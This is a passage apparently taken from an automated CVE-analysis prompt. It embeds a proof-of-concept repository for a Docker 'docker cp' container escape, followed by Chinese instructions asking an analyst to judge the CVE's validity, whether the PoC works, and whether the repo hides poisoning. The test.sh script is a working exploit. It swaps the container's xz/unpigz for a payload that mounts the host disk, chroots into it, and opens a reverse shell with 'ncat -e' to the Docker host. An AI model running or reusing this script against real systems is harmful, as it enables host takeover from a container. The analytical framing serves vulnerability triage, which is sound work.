n ---> Using cache\n ---> 423b0e1891a6\nStep 5/7 : COPY exploit.sh /usr/bin/unpigz\n ---> Using cache\n ---> 74eff85cf988\nStep 6/7 : RUN chmod +x /usr/bin/unpigz\n ---> Using cache\n ---> 2f773fa12931\nStep 7/7 : CMD [ \"sleep\", \"9999999\" ]\n ---> Using cache\n ---> 7b99f12dbe8d\nSuccessfully built 7b99f12dbe8d\nSuccessfully tagged cve-2026-41567:latest\ncve-2026-41567\n5679a4dc643c65a20039de693fad1f1caeea7fe5760b5c4049d1d4f37f5ab825\ntar: Removing leading `/' from member names\n/etc/hosts\nSuccessfully copied 0B to cve-2026-41567:/tmp\n```\n\nNote that you need to have privileges to talk to the Docker daemon (usually being root).\n\n\n---\n/tmp/00d359aea77b40d13d91dfeaf0ca20da/test.sh\n---\n#!/bin/sh\n\nset -eu\n\nNAME=cve-2026-41567\nPORT=50005\n\ncat >exploit.sh <<_END_\n#!/bin/sh\nPATH=/usr/bin:/bin:/usr/sbin:/sbin\n\n# Mount host filesystems\nmount -t proc none /proc >>/tmp/e 2>>/tmp/e\nmount -t devtmpfs none /dev >>/tmp/e 2>>/tmp/e\nmount /dev/sda1 /mnt >>/tmp/e 2>>/tmp/e\nchroot /mnt cat /etc/hostname >>/tmp/e 2>>/tmp/e\n\n# Create a reverse shell on the host (default docker host)\nncat -e '/usr/sbin/chroot /mnt /usr/bin/bash' 172.17.0.1 \"$PORT\" 2>>/tmp/e\n_END_\n\n# Prepare dockerfile with exploit binaries\ncat >Dockerfile <<_END_\nFROM debian\n\nRUN apt update && apt install -y ncat\n\nCOPY exploit.sh /usr/bin/xz\nRUN chmod +x /usr/bin/xz\n\nCOPY exploit.sh /usr/bin/unpigz\nRUN chmod +x /usr/bin/unpigz\n\nCMD [ \"sleep\", \"9999999\" ]\n_END_\n\ndocker build -t \"$NAME\" .\ndocker rm --force \"$NAME\" || true\ndocker run --rm -ti -d --name \"$NAME\" \"$NAME\"\n\n# Test\ntar cvaf test.xz /etc/hosts\ncat test.xz | docker cp - \"$NAME:/tmp\" || true\ndocker exec -ti \"$NAME\" cat /tmp/e\n\n\n---\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分